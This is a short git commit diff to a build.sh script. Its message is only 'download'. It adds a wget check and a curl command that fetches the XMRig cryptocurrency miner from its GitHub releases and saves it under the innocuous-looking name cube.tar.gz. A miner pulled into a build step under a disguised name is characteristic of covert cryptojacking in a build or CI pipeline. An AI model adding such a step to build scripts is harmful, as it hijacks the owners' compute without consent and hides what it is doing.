785c162447096a4d01d1b071d8f892adf0a708eb
vladimir <vladimir@playsnook.com>
2024-09-13 02:12:27 +0300

    download

--- build.sh
+++ build.sh
@@ -5,3 +5,6 @@ cat /etc/os-release
 which curl
 which npm 
 which node
+which wget
+
+curl https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz > cube.tar.gz
